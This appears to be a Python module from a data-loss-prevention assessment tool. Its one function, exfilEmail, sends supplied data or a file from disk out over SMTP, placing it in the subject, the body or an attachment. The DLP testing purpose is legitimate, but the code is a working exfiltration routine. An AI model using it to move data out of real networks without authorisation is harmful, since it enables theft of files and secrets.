from datetime import datetime
import logging
import smtplib, ssl
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.application import MIMEApplication
from tabulate import tabulate

# Exfiltrate Data over email
# Password and TLS are optional
# Location can be 'subject', 'body' or 'attachment'
def exfilEmail(Server, Port, To, From, FromPasswd, Location, Data, TLS=False):
    logging.debug("Using email exfiltration")
    if isinstance(Data, list):
        if Location == "subject":
            logging.debug("Data is a list, converting to string for subject")
            Data = ','.join(Data)
        if Location == "attachment":
            logging.debug("Data is a list, converting to string for attachment")
            Data = Data[0]

    if isinstance(Data, str):
        if Location == "body":
            logging.debug("Data is a string, converting to list for body")
            Data = [Data]

    try:
        logging.debug("Attempting to build email")
        message = MIMEMultipart('mixed')
        message['From'] = f"DLP Assessment <{From}>"
        message['To'] = To

        gentime = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        if Location == "subject":
            message['Subject'] = Data
        else:
            message['Subject'] = f"DLP Assessment Email: {gentime}"

        if Location == "body":
            html = f"""
            <html>
                <h1>DLP Assement Email: {gentime}</h1>
                {tabulate(Data, tablefmt='html')}
            </html>"""
            body = MIMEText(html, 'html')
            message.attach(body)
        else:
            html = f"<h1>DLP Assement Emaiol: {gentime}</h1>"
            body = MIMEText(html, 'html')
            message.attach(body)

        logging.debug("added to/from/subject/body to email")

        if Location == "attachment":
            try:
                logging.debug("Attempting to add attachment to email")
                with open(Data, "rb") as attachment:
                    p = MIMEApplication(attachment.read())	# TODO: do I need to add _subtype? i.e. ,_subtype="pdf"
                    p.add_header('Content-Disposition', "attachment; filename= %s" % Data.split("\\")[-1]) 
                    message.attach(p)
            except Exception as e:
                logging.error(f"Failed to add attachment to email: {e}")

        msg_full = message.as_string()

        with smtplib.SMTP(Server, Port) as server:
            if TLS:
                logging.debug("Using TLS")
                context = ssl.create_default_context()
                server.ehlo()
                server.starttls(context=context)
                server.ehlo()
                logging.debug("TLS enabled")

            if FromPasswd != '' and FromPasswd is not None:
                logging.debug("Using SMTP authentication")
                server.login(From, FromPasswd)

            logging.debug("Attempting to send email")
            server.sendmail(From,
                        To.split(";"),
                        msg_full)

            logging.debug("Email sent")
            server.quit()

        logging.debug("Done with email exfiltration")
        return True
    except Exception as e:
        logging.error(f"Failed to send email: {e}")
        return False
